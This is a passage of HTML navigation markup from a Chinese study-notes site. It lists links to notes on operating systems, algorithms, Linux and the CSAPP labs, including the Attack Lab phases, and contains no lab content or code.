href=../../OS/%E8%99%9A%E6%8B%9F%E5%8C%96/ class=md-nav__link> <span class=md-ellipsis> 虚拟化 </span> </a> </li> <li class=md-nav__item> <a href=../../OS/%E6%8C%81%E4%B9%85%E5%8C%96/ class=md-nav__link> <span class=md-ellipsis> 持久化 </span> </a> </li> <li class=md-nav__item> <a href=../../OS/%E6%80%BB%E7%BB%93/ class=md-nav__link> <span class=md-ellipsis> 总结 </span> </a> </li> <li class=md-nav__item> <a href=../../OS/Lab/ class=md-nav__link> <span class=md-ellipsis> Lab </span> </a> </li> <li class=md-nav__item> <a href=../../OS/OSTEP/ class=md-nav__link> <span class=md-ellipsis> OSTEP </span> </a> </li> <li class=md-nav__item> <a href=../../OS/CodingForSSD/ class=md-nav__link> <span class=md-ellipsis> Coding for SSD </span> </a> </li> <li class=md-nav__item> <a href=../../OS/SJTU_OS/ class=md-nav__link> <span class=md-ellipsis> SJTU OS </span> </a> </li> <li class=md-nav__item> <a href=../../OS/MIT6.S081/ class=md-nav__link> <span class=md-ellipsis> MIT6.S081 </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type=checkbox id=__nav_9> <label class=md-nav__link for=__nav_9 id=__nav_9_label tabindex=0> <span class=md-ellipsis> 数据结构 </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=1 aria-labelledby=__nav_9_label aria-expanded=false> <label class=md-nav__title for=__nav_9> <span class="md-nav__icon md-icon"></span> 数据结构 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../DS_Algo/CS61B/CS61B/ class=md-nav__link> <span class=md-ellipsis> CS61B 绪论 </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type=checkbox id=__nav_10> <label class=md-nav__link for=__nav_10 id=__nav_10_label tabindex=0> <span class=md-ellipsis> 算法 </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=1 aria-labelledby=__nav_10_label aria-expanded=false> <label class=md-nav__title for=__nav_10> <span class="md-nav__icon md-icon"></span> 算法 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../DS_Algo/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3%E4%B8%8E%E5%8F%8C%E6%8C%87%E9%92%88/ class=md-nav__link> <span class=md-ellipsis> 滑动窗口与双指针 </span> </a> </li> <li class=md-nav__item> <a href=../../DS_Algo/%E4%BA%8C%E5%88%86%E7%AE%97%E6%B3%95/ class=md-nav__link> <span class=md-ellipsis> 二分算法 </span> </a> </li> <li class=md-nav__item> <a href=../../DS_Algo/%E5%8D%95%E8%B0%83%E6%A0%88/ class=md-nav__link> <span class=md-ellipsis> 单调栈 </span> </a> </li> <li class=md-nav__item> <a href=../../DS_Algo/%E7%BD%91%E6%A0%BC%E5%9B%BE/ class=md-nav__link> <span class=md-ellipsis> 网格图 </span> </a> </li> <li class=md-nav__item> <a href=../../DS_Algo/%E4%BD%8D%E8%BF%90%E7%AE%97/ class=md-nav__link> <span class=md-ellipsis> 位运算 </span> </a> </li> <li class=md-nav__item> <a href=../../DS_Algo/%E5%9B%BE%E8%AE%BA%E7%AE%97%E6%B3%95/ class=md-nav__link> <span class=md-ellipsis> 图论算法 </span> </a> </li> <li class=md-nav__item> <a href=../../DS_Algo/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/ class=md-nav__link> <span class=md-ellipsis> 动态规划 </span> </a> </li> <li class=md-nav__item> <a href=../../DS_Algo/%E5%B8%B8%E7%94%A8%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/ class=md-nav__link> <span class=md-ellipsis> 常用数据结构 </span> </a> </li> <li class=md-nav__item> <a href=../../DS_Algo/%E6%95%B0%E5%AD%A6%E7%AE%97%E6%B3%95/ class=md-nav__link> <span class=md-ellipsis> 数学算法 </span> </a> </li> <li class=md-nav__item> <a href=../../DS_Algo/%E8%B4%AA%E5%BF%83%E4%B8%8E%E6%80%9D%E7%BB%B4/ class=md-nav__link> <span class=md-ellipsis> 贪心与思维 </span> </a> </li> <li class=md-nav__item> <a href=../../DS_Algo/%E9%93%BE%E8%A1%A8_%E4%BA%8C%E5%8F%89%E6%A0%91%E4%B8%8E%E5%9B%9E%E6%BA%AF/ class=md-nav__link> <span class=md-ellipsis> 链表 二叉树与回溯 </span> </a> </li> <li class=md-nav__item> <a href=../../DS_Algo/%E5%AD%97%E7%AC%A6%E4%B8%B2/ class=md-nav__link> <span class=md-ellipsis> 字符串 </span> </a> </li> <li class=md-nav__item> <a href=../../DS_Algo/HOT100/ class=md-nav__link> <span class=md-ellipsis> HOT 100 </span> </a> </li> <li class=md-nav__item> <a href=../../DS_Algo/HOT150/ class=md-nav__link> <span class=md-ellipsis> HOT 150 </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type=checkbox id=__nav_11 checked> <label class=md-nav__link for=__nav_11 id=__nav_11_label tabindex> <span class=md-ellipsis> CSAPP </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=1 aria-labelledby=__nav_11_label aria-expanded=true> <label class=md-nav__title for=__nav_11> <span class="md-nav__icon md-icon"></span> CSAPP </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../CH1/ class=md-nav__link> <span class=md-ellipsis> 绪论 </span> </a> </li> <li class=md-nav__item> <a href=../%E5%86%85%E5%AD%98/ class=md-nav__link> <span class=md-ellipsis> 内存 </span> </a> </li> <li class="md-nav__item md-nav__item--active"> <input class="md-nav__toggle md-toggle" type=checkbox id=__toc> <label class="md-nav__link md-nav__link--active" for=__toc> <span class=md-ellipsis> Lab </span> <span class="md-nav__icon md-icon"></span> </label> <a href=./ class="md-nav__link md-nav__link--active"> <span class=md-ellipsis> Lab </span> </a> <nav class="md-nav md-nav--secondary" aria-label=目录> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> 目录 </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#_1 class=md-nav__link> <span class=md-ellipsis> 参考资料 </span> </a> </li> <li class=md-nav__item> <a href=#data-lab class=md-nav__link> <span class=md-ellipsis> Data Lab </span> </a> <nav class=md-nav aria-label="Data Lab"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#bitxor class=md-nav__link> <span class=md-ellipsis> bitXor </span> </a> </li> <li class=md-nav__item> <a href=#tmin class=md-nav__link> <span class=md-ellipsis> tmin </span> </a> </li> <li class=md-nav__item> <a href=#istmax class=md-nav__link> <span class=md-ellipsis> isTmax </span> </a> </li> <li class=md-nav__item> <a href=#alloddbits class=md-nav__link> <span class=md-ellipsis> allOddBits </span> </a> </li> <li class=md-nav__item> <a href=#negate class=md-nav__link> <span class=md-ellipsis> negate </span> </a> </li> <li class=md-nav__item> <a href=#isasciidigit class=md-nav__link> <span class=md-ellipsis> isAsciiDigit </span> </a> </li> <li class=md-nav__item> <a href=#conditional class=md-nav__link> <span class=md-ellipsis> conditional </span> </a> </li> <li class=md-nav__item> <a href=#islessorequal class=md-nav__link> <span class=md-ellipsis> isLessOrEqual </span> </a> </li> <li class=md-nav__item> <a href=#logicalneg class=md-nav__link> <span class=md-ellipsis> logicalNeg </span> </a> </li> <li class=md-nav__item> <a href=#howmanybits class=md-nav__link> <span class=md-ellipsis> howManyBits </span> </a> </li> <li class=md-nav__item> <a href=#floatscale2 class=md-nav__link> <span class=md-ellipsis> floatScale2 </span> </a> </li> <li class=md-nav__item> <a href=#floatfloat2int class=md-nav__link> <span class=md-ellipsis> floatFloat2Int </span> </a> </li> <li class=md-nav__item> <a href=#floatpower2 class=md-nav__link> <span class=md-ellipsis> floatPower2 </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#boom-lab class=md-nav__link> <span class=md-ellipsis> Boom Lab </span> </a> <nav class=md-nav aria-label="Boom Lab"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#phase-1 class=md-nav__link> <span class=md-ellipsis> Phase 1 </span> </a> </li> <li class=md-nav__item> <a href=#phase-2 class=md-nav__link> <span class=md-ellipsis> Phase 2 </span> </a> </li> <li class=md-nav__item> <a href=#phase-3 class=md-nav__link> <span class=md-ellipsis> Phase 3 </span> </a> </li> <li class=md-nav__item> <a href=#phase-4 class=md-nav__link> <span class=md-ellipsis> Phase 4 </span> </a> </li> <li class=md-nav__item> <a href=#phase-5 class=md-nav__link> <span class=md-ellipsis> Phase 5 </span> </a> </li> <li class=md-nav__item> <a href=#phase-6 class=md-nav__link> <span class=md-ellipsis> Phase 6 </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#attack-lab class=md-nav__link> <span class=md-ellipsis> Attack Lab </span> </a> <nav class=md-nav aria-label="Attack Lab"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#phase-1_1 class=md-nav__link> <span class=md-ellipsis> Phase 1 </span> </a> </li> <li class=md-nav__item> <a href=#phase-2_1 class=md-nav__link> <span class=md-ellipsis> Phase 2 </span> </a> </li> <li class=md-nav__item> <a href=#phase-3_1 class=md-nav__link> <span class=md-ellipsis> Phase 3 </span> </a> </li> <li class=md-nav__item> <a href=#phase-4_1 class=md-nav__link> <span class=md-ellipsis> Phase 4 </span> </a> </li> <li class=md-nav__item> <a href=#phase-5_1 class=md-nav__link> <span class=md-ellipsis> Phase 5 </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#arch-lab class=md-nav__link> <span class=md-ellipsis> Arch Lab </span> </a> <nav class=md-nav aria-label="Arch Lab"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#part-a class=md-nav__link> <span class=md-ellipsis> Part A </span> </a> <nav class=md-nav aria-label="Part A"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#sum_list class=md-nav__link> <span class=md-ellipsis> sum_list </span> </a> </li> <li class=md-nav__item> <a href=#rsum_list class=md-nav__link> <span class=md-ellipsis> rsum_list </span> </a> </li> <li class=md-nav__item> <a href=#copy_block class=md-nav__link> <span class=md-ellipsis> copy_block </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#part-b class=md-nav__link> <span class=md-ellipsis> Part B </span> </a> </li> <li class=md-nav__item> <a href=#part-c class=md-nav__link> <span class=md-ellipsis> Part C </span> </a> <nav class=md-nav aria-label="Part C"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#iaddq class=md-nav__link> <span class=md-ellipsis> 利用iaddq </span> </a> </li> <li class=md-nav__item> <a href=#_2 class=md-nav__link> <span class=md-ellipsis> 循环展开 </span> </a> </li> <li class=md-nav__item> <a href=#_3 class=md-nav__link> <span class=md-ellipsis> 剩余数据处理 </span> </a> </li> <li class=md-nav__item> <a href=#_4 class=md-nav__link> <span class=md-ellipsis> 消除气泡 </span> </a> </li> <li class=md-nav__item> <a href=#_5 class=md-nav__link> <span class=md-ellipsis> 测试结果及分数 </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#cache-lab class=md-nav__link> <span class=md-ellipsis> Cache Lab </span> </a> <nav class=md-nav aria-label="Cache Lab"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_6 class=md-nav__link> <span class=md-ellipsis> 实验概览 </span> </a> </li> <li class=md-nav__item> <a href=#part-a-writing-a-cache-simulator class=md-nav__link> <span class=md-ellipsis> Part A: Writing a Cache Simulator </span> </a> <nav class=md-nav aria-label="Part A: Writing a Cache Simulator"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#cache class=md-nav__link> <span class=md-ellipsis> Cache 结构 </span> </a> </li> <li class=md-nav__item> <a href=#_7 class=md-nav__link> <span class=md-ellipsis> 替换策略 </span> </a> </li> <li class=md-nav__item> <a href=#_8 class=md-nav__link> <span class=md-ellipsis> 数据结构 </span> </a> </li> <li class=md-nav__item> <a href=#lru class=md-nav__link> <span class=md-ellipsis> LRU 时间戳实现 </span> </a> </li> <li class=md-nav__item> <a href=#_9 class=md-nav__link> <span class=md-ellipsis> 缓存搜索及更新 </span> </a> </li> <li class=md-nav__item> <a href=#_10 class=md-nav__link> <span class=md-ellipsis> 指令解析 </span> </a> </li> <li class=md-nav__item> <a href=#_11 class=md-nav__link> <span class=md-ellipsis> 命令行参数获取 </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#part-b-optimizing-matrix-transpose class=md-nav__link> <span class=md-ellipsis> Part B: Optimizing Matrix Transpose </span> </a> <nav class=md-nav aria-label="Part B: Optimizing Matrix Transpose"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#32-x-32 class=md-nav__link> <span class=md-ellipsis> 32 x 32 </span> </a> </li> <li class=md-nav__item> <a href=#64-x-64 class=md-nav__link> <span class=md-ellipsis> 64 x 64 </span> </a> </li> <li class=md-nav__item> <a href=#61-x-67 class=md-nav__link> <span class=md-ellipsis> 61 x 67 </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#performance-lab class=md-nav__link> <span class=md-ellipsis> Performance Lab </span> </a> </li> <li class=md-nav__item> <a href=#shell-lab class=md-nav__link> <span class=md-ellipsis> Shell Lab </span> </a> <nav class=md-nav aria-label="Shell Lab"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_12 class=md-nav__link> <span class=md-ellipsis> 实验概览 </span> </a> </li> <li class=md-nav__item> <a href=#_13 class=md-nav__link> <span class=md-ellipsis> 错误处理包装函数 </span> </a> </li> <li class=md-nav__item> <a href=#eval class=md-nav__link> <span class=md-ellipsis> eval </span> </a> </li> <li class=md-nav__item> <a href=#builtin_cmd class=md-nav__link> <span class=md-ellipsis> builtin_cmd </span> </a> </li> <li class=md-nav__item> <a href=#do_bgfg class=md-nav__link> <span class=md-ellipsis> do_bgfg </span> </a> </li> <li class=md-nav__item> <a href=#waitfg class=md-nav__link> <span class=md-ellipsis> waitfg </span> </a> </li> <li class=md-nav__item> <a href=#sigchld_handlersigint_handlersigtstp_handler class=md-nav__link> <span class=md-ellipsis> 信号处理函数实现 sigchld_handler/sigint_handler/sigtstp_handler </span> </a> </li> <li class=md-nav__item> <a href=#tsh class=md-nav__link> <span class=md-ellipsis> tsh 测试 </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#malloc-lab class=md-nav__link> <span class=md-ellipsis> Malloc Lab </span> </a> <nav class=md-nav aria-label="Malloc Lab"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_14 class=md-nav__link> <span class=md-ellipsis> 实验概览 </span> </a> </li> <li class=md-nav__item> <a href=#_15 class=md-nav__link> <span class=md-ellipsis> 实现思路 </span> </a> </li> <li class=md-nav__item> <a href=#implicit-free-list class=md-nav__link> <span class=md-ellipsis> Implicit Free List 实现 </span> </a> <nav class=md-nav aria-label="Implicit Free List 实现"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_16 class=md-nav__link> <span class=md-ellipsis> 空闲块组织 </span> </a> </li> <li class=md-nav__item> <a href=#_17 class=md-nav__link> <span class=md-ellipsis> 合并与分割 </span> </a> </li> <li class=md-nav__item> <a href=#_18 class=md-nav__link> <span class=md-ellipsis> 放置策略 </span> </a> </li> <li class=md-nav__item> <a href=#_19 class=md-nav__link> <span class=md-ellipsis> 分配块 </span> </a> </li> <li class=md-nav__item> <a href=#_20 class=md-nav__link> <span class=md-ellipsis> 测试结果及分数 </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#segregated-free-lists-segregated-fit class=md-nav__link> <span class=md-ellipsis> Segregated Free Lists实现 (Segregated Fit) </span> </a> <nav class=md-nav aria-label="Segregated Free Lists实现 (Segregated Fit)"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_21 class=md-nav__link> <span class=md-ellipsis> 结构设置 </span> </a> </li> <li class=md-nav__item> <a href=#_22 class=md-nav__link> <span class=md-ellipsis> 大小类设置 </span> </a> </li> <li class=md-nav__item> <a href=#_23 class=md-nav__link> <span class=md-ellipsis> 结构建立 </span> </a> </li> <li class=md-nav__item> <a href=#_24 class=md-nav__link> <span class=md-ellipsis> 维护链表 </span> </a> </li> <li class=md-nav__item> <a href=#_25 class=md-nav__link> <span class=md-ellipsis> 合并与分割 </span> </a> </li> <li class=md-nav__item> <a href=#_26 class=md-nav__link> <span class=md-ellipsis> 分配块 </span> </a> </li> <li class=md-nav__item> <a href=#_27 class=md-nav__link> <span class=md-ellipsis> 测试结果及分数 </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#proxy-lab class=md-nav__link> <span class=md-ellipsis> Proxy Lab </span> </a> <nav class=md-nav aria-label="Proxy Lab"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_28 class=md-nav__link> <span class=md-ellipsis> 实验概览 </span> </a> </li> <li class=md-nav__item> <a href=#tiny-web class=md-nav__link> <span class=md-ellipsis> TINY Web 服务器详解 </span> </a> <nav class=md-nav aria-label="TINY Web 服务器详解"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#http class=md-nav__link> <span class=md-ellipsis> 解析 HTTP 请求 </span> </a> </li> <li class=md-nav__item> <a href=#_29 class=md-nav__link> <span class=md-ellipsis> 提供静态内容 </span> </a> </li> <li class=md-nav__item> <a href=#_30 class=md-nav__link> <span class=md-ellipsis> 提供动态内容 </span> </a> </li> <li class=md-nav__item> <a href=#_31 class=md-nav__link> <span class=md-ellipsis> 主函数 </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#part-1-implementing-a-sequential-web-proxy class=md-nav__link> <span class=md-ellipsis> Part 1: Implementing a sequential web proxy </span> </a> <nav class=md-nav aria-label="Part 1: Implementing a sequential web proxy"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_32 class=md-nav__link> <span class=md-ellipsis> 等待客户端连接 </span> </a> </li> <li class=md-nav__item> <a href=#_33 class=md-nav__link> <span class=md-ellipsis> 转发与回复 </span> </a> </li> <li class=md-nav__item> <a href=#header class=md-nav__link> <span class=md-ellipsis> 构建header </span> </a> </li> <li class=md-nav__item> <a href=#uri class=md-nav__link> <span class=md-ellipsis> 解析uri </span> </a> </li> <li class=md-nav__item> <a href=#_34 class=md-nav__link> <span class=md-ellipsis> 测试与结果 </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#part-2-dealing-with-multiple-concurrent-requests class=md-nav__link> <span class=md-ellipsis> Part 2: Dealing with multiple concurrent requests </span> </a> <nav class=md-nav aria-label="Part 2: Dealing with multiple concurrent requests"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#- class=md-nav__link> <span class=md-ellipsis> 生产者-消费者模型 </span> </a> </li> <li class=md-nav__item> <a href=#proxy class=md-nav__link> <span class=md-ellipsis> 基于预线程化的 Proxy </span> </a> </li> <li class=md-nav__item> <a href=#_35 class=md-nav__link> <span class=md-ellipsis> 测试与结果 </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#part-3-caching-web-objects class=md-nav__link> <span class=md-ellipsis> Part 3: Caching web objects </span> </a> <nav class=md-nav aria-label="Part 3: Caching web objects"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#-_1 class=md-nav__link> <span class=md-ellipsis> 读者-写者模型 </span> </a> </li> <li class=md-nav__item> <a href=#cache_1 class=md-nav__link> <span class=md-ellipsis> Cache 结构 </span> </a> </li> <li class=md-nav__item> <a href=#_36 class=md-nav__link> <span class=md-ellipsis> 代码 </span> </a> </li> <li class=md-nav__item> <a href=#_37 class=md-nav__link> <span class=md-ellipsis> 测试与结果 </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#chrome class=md-nav__link> <span class=md-ellipsis> Chrome 实战测试 </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type=checkbox id=__nav_12> <label class=md-nav__link for=__nav_12 id=__nav_12_label tabindex=0> <span class=md-ellipsis> Linux </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=1 aria-labelledby=__nav_12_label aria-expanded=false> <label class=md-nav__title for=__nav_12> <span class="md-nav__icon md-icon"></span> Linux </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../Linux/Linux/ class=md-nav__link> <span class=md-ellipsis> 基础知识 </span> </a> </li> <li class=md-nav__item> <a href=../../Linux/useful_cmd/ class=md-nav__link> <span class=md-ellipsis> Useful cmd </span> </a> </li> <li class=md-nav__item> <a href=../../Linux/%E7%8E%A9%E8%BD%ACLinux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/ class=md-nav__link> <span class=md-ellipsis> 玩转Linux操作系统 </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../network.md class=md-nav__link> <span class=md-ellipsis> 计算机网络 </span> </a> </li> <li class=md-nav__item> <a href=../../database.md class=md-nav__link> <span class=md-ellipsis> 数据库 </span> </a> </li> <li class=md-nav__item> <a href=../../Tool/tool/ class=md-nav__link> <span class=md-ellipsis> Tool </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type=checkbox id=__nav_16> <label class=md-nav__link for=__nav_16 id=__nav_16_label tabindex=0> <span class=md-ellipsis> Misc </span> <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav data-md-level=1 aria-labelledby=__nav_16_label aria-expanded=false> <label class=md-nav__title for=__nav_16> <span class="md-nav__icon md-icon"></span> Misc </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../Misc/Memo/ class=md-nav__link> <span class=md-ellipsis> Memo </span> </a> </li> <li class=md-nav__item> <a href=../../Misc/Todo/ class=md-nav__link> <span class=md-ellipsis> Todo </span> </a> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=sidebar data-md-type=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary" aria-label=目录> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> 目录 </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#_1 class=md-nav__link> <span class=md-ellipsis> 参考资料 </span> </a> </li> <li class=md-nav__item> <a href=#data-lab class=md-nav__link> <span class=md-ellipsis> Data Lab </span> </a> <nav class=md-nav aria-label="Data Lab"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#bitxor class=md-nav__link> <span class=md-ellipsis> bitXor </span> </a> </li> <li class=md-nav__item> <a href=#tmin class=md-nav__link> <span class=md-ellipsis> tmin </span> </a> </li> <li class=md-nav__item> <a href=#istmax class=md-nav__link> <span class=md-ellipsis> isTmax </span> </a> </li> <li class=md-nav__item> <a href=#alloddbits class=md-nav__link> <span class=md-ellipsis> allOddBits </span> </a> </li> <li class=md-nav__item> <a href=#negate class=md-nav__link> <span class=md-ellipsis> negate </span> </a> </li> <li class=md-nav__item> <a href=#isasciidigit class=md-nav__link> <span class=md-ellipsis> isAsciiDigit </span> </a> </li> <li class=md-nav__item> <a href=#conditional class=md-nav__link> <span class=md-ellipsis> conditional </span> </a> </li> <li class=md-nav__item> <a href=#islessorequal class=md-nav__link> <span class=md-ellipsis> isLessOrEqual </span> </a> </li> <li class=md-nav__item> <a href=#logicalneg class=md-nav__link> <span class=md-ellipsis> logicalNeg </span> </a> </li> <li class=md-nav__item> <a href=#howmanybits class=md-nav__link> <span class=md-ellipsis> howManyBits </span> </a> </li> <li class=md-nav__item> <a href=#floatscale2 class=md-nav__link> <span class=md-ellipsis> floatScale2 </span> </a> </li> <li class=md-nav__item> <a href=#floatfloat2int class=md-nav__link> <span class=md-ellipsis> floatFloat2Int </span> </a> </li> <li class=md-nav__item> <a href=#floatpower2 class=md-nav__link> <span class=md-ellipsis> floatPower2 </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#boom-lab class=md-nav__link> <span class=md-ellipsis> Boom Lab </span> </a> <nav class=md-nav aria-label="Boom Lab"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#phase-1 class=md-nav__link> <span class=md-ellipsis> Phase 1 </span> </a> </li> <li class=md-nav__item> <a href=#phase-2 class=md-nav__link> <span class=md-ellipsis> Phase 2 </span> </a> </li> <li class=md-nav__item> <a href=#phase-3 class=md-nav__link> <span class=md-ellipsis> Phase 3 </span> </a> </li> <li class=md-nav__item> <a href=#phase-4 class=md-nav__link> <span class=md-ellipsis> Phase 4 </span> </a> </li> <li class=md-nav__item> <a href=#phase-5 class=md-nav__link> <span class=md-ellipsis> Phase 5 </span> </a> </li> <li class=md-nav__item> <a href=#phase-6 class=md-nav__link> <span class=md-ellipsis> Phase 6 </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#attack-lab class=md-nav__link> <span class=md-ellipsis> Attack Lab </span> </a> <nav class=md-nav aria-label="Attack Lab"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#phase-1_1 class=md-nav__link> <span class=md-ellipsis> Phase 1 </span> </a> </li> <li class=md-nav__item> <a href=#phase-2_1 class=md-nav__link> <span class=md-ellipsis> Phase 2 </span> </a> </li> <li class=md-nav__item> <a href=#phase-3_1 class=md-nav__link> <span class=md-ellipsis> Phase 3 </span> </a> </li> <li class=md-nav__item> <a href=#phase-4_1 class=md-nav__link> <span class=md-ellipsis> Phase 4 </span> </a> </li> <li class=md-nav__item> <a href=#phase-5_1 class=md-nav__link> <span class=md-ellipsis> Phase 5 </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#arch-lab class=md-nav__link> <span class=md-ellipsis> Arch Lab </span> </a> <nav class=md-nav aria-label="Arch Lab"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#part-a class=md-nav__link> <span class=md-ellipsis> Part A </span> </a> <nav class=md-nav aria-label="Part A"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#sum_list class=md-nav__link> <span class=md-ellipsis> sum_list </span> </a> </li> <li class=md-nav__item> <a href=#rsum_list class=md-nav__link> <span class=md-ellipsis> rsum_list </span> </a> </li> <li class=md-nav__item> <a href=#copy_block class=md-nav__link> <span class=md-ellipsis> copy_block </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#part-b class=md-nav__link> <span class=md-ellipsis> Part B </span> </a> </li> <li class=md-nav__item> <a href=#part-c class=md-nav__link> <span class=md-ellipsis> Part C </span> </a> <nav class=md-nav aria-label="Part C"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#iaddq class=md-nav__link> <span class=md-ellipsis> 利用iaddq </span> </a> </li> <li class=md-nav__item> <a href=#_2 class=md-nav__link> <span class=md-ellipsis> 循环展开 </span> </a> </li> <li class=md-nav__item> <a href=#_3 class=md-nav__link> <span class=md-ellipsis> 剩余数据处理 </span> </a> </li> <li class=md-nav__item> <a href=#_4 class=md-nav__link> <span class=md-ellipsis> 消除气泡 </span> </a> </li> <li class=md-nav__item> <a href=#_5 class=md-nav__link> <span class=md-ellipsis> 测试结果及分数 </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#cache-lab class=md-nav__link> <span class=md-ellipsis> Cache Lab </span> </a> <nav class=md-nav aria-label="Cache Lab"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_6 class=md-nav__link> <span class=md-ellipsis> 实验概览 </span> </a> </li> <li class=md-nav__item> <a href=#part-a-writing-a-cache-simulator class=md-nav__link> <span class=md-ellipsis> Part A: Writing a Cache Simulator </span> </a> <nav class=md-nav aria-label="Part A: Writing a Cache Simulator"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#cache class=md-nav__link> <span class=md-ellipsis> Cache 结构 </span> </a> </li> <li class=md-nav__item> <a href=#_7 class=md-nav__link> <span class=md-ellipsis> 替换策略 </span> </a> </li> <li class=md-nav__item> <a href=#_8 class=md-nav__link> <span class=md-ellipsis> 数据结构 </span> </a> </li> <li class=md-nav__item> <a href=#lru class=md-nav__link> <span class=md-ellipsis> LRU 时间戳实现 </span> </a> </li> <li class=md-nav__item> <a href=#_9 class=md-nav__link> <span class=md-ellipsis> 缓存搜索及更新 </span> </a> </li> <li class=md-nav__item> <a href=#_10 class=md-nav__link> <span class=md-ellipsis> 指令解析 </span> </a> </li> <li class=md-nav__item> <a href=#_11 class=md-nav__link> <span class=md-ellipsis> 命令行参数获取 </span> </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#part-b-optimizing-matrix-transpose class=md-nav__link> <span class=md-ellipsis> Part B: Optimizing Matrix Transpose </span> </a> <nav class=md-nav aria-label="Part B: Optimizing Matrix Transpose"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#32-x-32 class=md-nav__link> <span class=md-ellipsis> 32 x 32 </span> </a> </li> <li class=md-nav__item> <a href=#64-x-64 class=md-nav__link> <span class=md-ellipsis> 64 x 64 </span> </a> </li> <li class=md-nav__item> <a href=#61-x-67 class=md-nav__link> <span class=md-ellipsis> 61 x 67 </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#performance-lab class=md-nav__link> <span class=md-ellipsis> Performance Lab </span> </a> </li> <li class=md-nav__item> <a href=#shell-lab class=md-nav__link> <span class=md-ellipsis> Shell Lab </span> </a> <nav class=md-nav aria-label="Shell Lab"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_12 class=md-nav__link> <span class=md-ellipsis> 实验概览 </span> </a> </li> <li class=md-nav__item> <a href=#_13 class=md-nav__link> <span class=md-ellipsis> 错误处理包装函数 </span> </a> </li> <li 